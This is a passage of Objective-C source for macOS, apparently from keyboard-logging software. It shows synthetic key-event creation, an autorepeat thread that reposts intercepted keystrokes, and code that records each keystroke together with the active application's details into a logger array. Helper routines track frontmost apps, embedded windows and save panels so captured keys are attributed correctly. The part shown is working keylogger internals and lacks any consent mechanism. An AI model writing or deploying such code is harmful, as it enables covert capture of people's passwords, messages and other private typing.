            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 93:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Minus, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 94:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_RightBracket, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 95:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_LeftBracket, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 96:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Quote, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 97:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Semicolon, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 98:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Backslash, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 99:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Comma, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 100:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Slash, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 101:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Period, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 102:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Grave, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 103:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_0, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 104:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_1, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 105:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_2, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 106:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_3, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 107:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_4, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 108:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_5, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 109:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_6, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 110:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_7, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 111:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_8, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 112:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_9, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 200:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadEnter, FALSE);
            break;
        case 201:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Return, FALSE);
            break;
        case 202:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Tab, FALSE);
            break;
        case 203:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Delete, FALSE);
            break;
        case 204:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Shift, FALSE);
            break;
        case 205:
            key = CGEventCreateKeyboardEvent(aSource, kVK_RightShift, FALSE);
            break;
        case 206:
            key = CGEventCreateKeyboardEvent(aSource, kVK_RightArrow, FALSE);
            break;
        case 207:
            key = CGEventCreateKeyboardEvent(aSource, kVK_LeftArrow, FALSE);
            break;
        case 208:
            key = CGEventCreateKeyboardEvent(aSource, kVK_UpArrow, FALSE);
            break;
        case 209:
            key = CGEventCreateKeyboardEvent(aSource, kVK_DownArrow, FALSE);
            break;
        default:
            break;
    }
    return key;
}

#pragma mark Thread functions/methods
#pragma mark -

-(void) prepareAutorepeat: (id) aArgs {
    CGEventRef eventRef = (CGEventRef)[aArgs objectAtIndex:0];
    //NSString *symbol = [aArgs objectAtIndex:1];
    int64_t autorepeat = CGEventGetIntegerValueField((CGEventRef)eventRef, kCGKeyboardEventAutorepeat);
    DLog(@"autorepeat = %lld", autorepeat);
    
    // Cancel previous thread
    [[self mThreadAutorepeat] cancel];
    [self setMThreadAutorepeat:nil];
    
    [NSThread detachNewThreadSelector:@selector(autorepeat:) toTarget:self withObject:aArgs];
}

-(void) autorepeat: (id) aArgs {
    NSAutoreleasePool * pool1 = [[NSAutoreleasePool alloc]init];
    DLog(@"Auto repeat thread is started");
    CGEventRef eventRef = (CGEventRef)[aArgs objectAtIndex:0];
    NSString *symbol = [aArgs objectAtIndex:1];
    [self setMThreadAutorepeat:[NSThread currentThread]];
    @try {
        while ([self.mKeyHold count]>0 && ![[NSThread currentThread] isCancelled]) { // Check if this thread is cancelled in prepareAutoRepeat method
            NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
            [NSThread sleepForTimeInterval:0.000005];
            if ([self.mKeyHold count]>0) {
                //CGEventPost(kCGAnnotatedSessionEventTap,(CGEventRef)[self.mKeyHold objectAtIndex:([self.mKeyHold count]-1)]);
                //NSEvent *event = [NSEvent eventWithCGEvent:(CGEventRef)[self.mKeyHold objectAtIndex:([self.mKeyHold count]-1)]];
                
                CGEventPost(kCGAnnotatedSessionEventTap,(CGEventRef)eventRef);
                NSEvent *event = [NSEvent eventWithCGEvent:(CGEventRef)eventRef];
                if ([symbol length] == 0) {
                    symbol = [event characters];
                }
                
                NSDictionary *activeAppInfo =[[NSWorkspace sharedWorkspace]activeApplication];
                NSMutableDictionary *keyInfo = [KeyboardLoggerUtils getKeyInfoWithKeyString:[event characters] rawKeyRep:symbol activeAppInfo:activeAppInfo psn:[self frontMostPSNV2]];
                if (keyInfo) {
                    NSMutableDictionary *previousKeyInfo = [KeyboardLoggerUtils getPreviousKeyInfoWithArray:self.mLoggerArray byNewKeyInfo:keyInfo];
                    if (previousKeyInfo) {
                        NSMutableDictionary *newKeyInfo = [KeyboardLoggerUtils mergeKeyInfo:previousKeyInfo withKeyInfo:keyInfo];
                        [self.mLoggerArray removeObject:previousKeyInfo];
                        [self.mLoggerArray insertObject:newKeyInfo atIndex:0];
                    } else {
                        [self.mLoggerArray insertObject:keyInfo atIndex:0];
                    }
                }
            }
            [pool2 release];
        }
    }
    @catch (NSException *exception) {
       DLog(@"Auto repeat thread got exception = %@", exception);
    }
    @finally {
        ;
    }
    DLog(@"Auto repeat thread is stopped");
    [pool1 release];
}

- (ProcessSerialNumber) activePSN {
    ProcessSerialNumber psn = {0, 0};
    NSWorkspace * ws = [NSWorkspace sharedWorkspace];
    NSDictionary * activeAppInfo = [ws activeApplication];
    psn.lowLongOfPSN = (UInt32)[[activeAppInfo objectForKey:@"NSApplicationProcessSerialNumberLow"] unsignedIntegerValue];
    psn.highLongOfPSN = (UInt32)[[activeAppInfo objectForKey:@"NSApplicationProcessSerialNumberHigh"] unsignedIntegerValue];
    DLog (@"activeAppInfo: %@", activeAppInfo);
    return (psn);
}

/*
 When embedded window is shown in host process there must be corresponding blank window (the same postision and size) in host process too.
 */
- (ProcessSerialNumber) frontMostPSN {
    ProcessSerialNumber psn = {0, 0};
    
    NSWorkspace * ws = [NSWorkspace sharedWorkspace];
    NSRunningApplication *rApp = [ws frontmostApplication];
    pid_t pid = [rApp processIdentifier];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    if (GetProcessForPID(pid, &psn) != noErr) {
       DLog(@"Error getting PSN fron front most app...");
    }
#pragma GCC diagnostic pop
    
    NSMutableArray *rWindowDicts = [NSMutableArray array];
    
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        if (0 == [windowLayer intValue] && pid == (pid_t)[windowPID integerValue]) {
            [rWindowDicts addObject:windowDict];
        }
    }
    CFBridgingRelease(windowList);
    
    NSArray *panelWindowDicts = [KeyboardLoggerUtils windowDictsOfSavePanelService];
    
   DLog(@"rWindowDicts = %@", rWindowDicts);
   DLog(@"panelWindowDicts = %@", panelWindowDicts);
    
    for (NSDictionary *panelWindowDict in panelWindowDicts) {
        CGRect pBound = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[panelWindowDict objectForKey:(NSString *)kCGWindowBounds], &pBound);
        for (NSDictionary *rWindowDict in rWindowDicts) {
            CGRect rBound = CGRectNull;
            CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[rWindowDict objectForKey:(NSString *)kCGWindowBounds], &rBound);
            
            if (CGRectEqualToRect(pBound, rBound)) {
                NSNumber *windowPID = [panelWindowDict objectForKey:(NSString *)kCGWindowOwnerPID];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
                if (GetProcessForPID((pid_t)[windowPID integerValue], &psn) != noErr) {
                   DLog(@"Error getting PSN fron SavePanelSevice...");
                }
#pragma GCC diagnostic pop
                break;
            }
        }
    }
    
    return (psn);
}

/*
 Using Carbon ALC to detect embedded window is launched then keep track of embedded window's remote PID. Whenever there is key stroke to post, check front most
 PID and match it back to remote PID of embedded window to find whether embedded window is shown.
 */

- (ProcessSerialNumber) frontMostPSNV2 {
    ProcessSerialNumber psn = {0, 0};
    
    NSWorkspace * ws = [NSWorkspace sharedWorkspace];
    NSRunningApplication *rApp = [ws frontmostApplication];
    pid_t pid = [rApp processIdentifier];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    if (GetProcessForPID(pid, &psn) != noErr) {
       DLog(@"Error getting PSN fron front most app...");
    }
#pragma GCC diagnostic pop
    
//    DLog(@"pid : %d", pid);
//    DLog(@"self.mEmbeddedApps : %@", self.mEmbeddedApps);
   
    // Search to see whether pid has embedded app
    for (EmbeddedApplicationInfo *embApp in self.mEmbeddedApps) {
        if (embApp.mHostPID == pid) {
            if (isOSX_10_10_OrGreater) {
                if ([KeyboardLoggerUtils isEmbeddedWindowInFocused:embApp.mPID inRemoteApp:embApp.mHostPID]) {
                    psn = embApp.mPSN;
                    break;
                }
            }
            else {
                if ([KeyboardLoggerUtils embeddedWindowDictWithPID:embApp.mPID]) {
                    psn = embApp.mPSN;
                    break;
                }
            }
        }
    }
    
    /**********************************************************************************************************************************
     Known issue (macOS < 10.10) :
     
     Use case: user uses TextEdit to open two windows w1 & w2 to write documents then user saves w1's document, saving dialog will
     appear and without confirm save user changes to w2 to edit document at this point user cannot edit w2.
     
     Issue: cannot post key stroke to w2 while saving dialog of w1 is appearing.
     ***********************************************************************************************************************************/
    
    return (psn);
}

#pragma mark dealloc method
#pragma mark -

- (void)dealloc{
    [self stopKeyboardLog];
    [mLoggerArray release];
    [mKeyHold release];
    [mEmbeddedApps release];
    [self setMThreadAutorepeat:nil];
    dispatch_release(queue_serial_keyboardlogger);
    [super dealloc];
}

@end
